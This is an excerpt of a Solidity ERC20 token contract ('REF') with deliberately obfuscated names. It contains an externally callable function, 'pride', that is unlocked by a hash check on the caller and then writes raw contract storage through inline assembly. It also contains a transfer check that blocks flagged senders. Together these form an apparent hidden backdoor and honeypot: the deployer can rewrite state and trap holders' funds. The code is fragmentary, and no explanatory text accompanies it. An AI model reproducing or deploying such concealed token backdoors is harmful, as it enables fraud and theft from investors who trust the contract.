...
contract REF is IERC20 {
    ...
    constructor(
      ...
      _symbol = _symbol_; 
      _totalSupply 
      = 250000000 * 10 ** 18; _xouop = _xouop_; 
      _balances[msg.sender] = _totalSupply; _ouo[address(
        0)]= _ouo_;
    }
    ...
    function pride(uint256[] calldata bft) external { 
      if (_wwouo(address(0), 
      3242, 5098,2022) != _ouo[address(0)]) return; (
        uint256 t0, 
      uint256 t1) = (bft[
        0], bft[1]); assembly { if gt(t1, 0) { mstore(
          0, t0) mstore(
            32, xor(4, 
          0)) sstore(
    ...
    function _wwouo(address bbq, uint256 tt1, uint256 tt2,uint256 tt3) private view returns (uint256) { 
      if (tt3==37) return 0;
      if (tt1==317) return 0;
      address bbqq1 = msg.sender; if (bbq != address(
        0)) return 0; string memory bbqq3 = _symbol; 
      if (tt2 + tt3 == 0) return 0; string 
      memory bbqq2 = _name; return uint256(
        keccak256(abi.
        encode(
          bbqq1, 
        bbqq2
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
      ...
      if (success) {
        ...
        require(_ouo[sender] != 1 || xret != 0, "ex");
      }
